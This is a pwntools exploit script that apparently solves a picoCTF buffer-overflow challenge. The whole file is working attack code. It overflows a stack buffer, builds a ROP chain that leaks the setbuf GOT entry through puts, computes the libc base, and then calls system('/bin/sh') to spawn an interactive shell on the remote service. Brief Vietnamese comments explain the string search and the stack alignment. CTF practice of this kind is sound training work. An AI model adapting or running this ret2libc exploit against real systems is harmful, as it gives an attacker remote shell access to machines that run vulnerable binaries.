from pwn import *


exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

context.binary = exe
padding=b"A"*0x88

rdi=0x0000000000400913
plt=exe.plt["puts"]
got=0x601028    #setbuff
main=exe.symbols["main"]

t=remote(b"mercury.picoctf.net",1774)
#t=process("./vuln_patched")
#gdb.attach(t,api=True)

payload=padding+p64(rdi)+p64(got)+p64(plt)+p64(main)
t.recv()
t.sendline(payload)
leak=t.recvuntil(b"!")

leak=leak.split(b"\n")[2].ljust(8,b"\x00")
leak=u64(leak)
libc_base=leak-0x88540
system=libc_base+0x000000000004f4e0
ret=0x000000000040052e
bin_sh=libc_base+next(libc.search(b"/bin/sh")) #search la tim kiem chuoi con next la de lay tiep theo cua chuoi la dia chi

log.success("***Successfull leak address***")
log.info("Setbuff addres :"+hex(leak))
log.info("Libc base address :"+hex(libc_base))
log.info("bin/sh addres :"+hex(bin_sh))


payload=padding+p64(rdi)+p64(bin_sh)+p64(ret)+p64(system) #khong co thanh ghi xmm0 thi stack khi thuc hien system phai duoi 8
t.sendline(payload)

t.interactive()
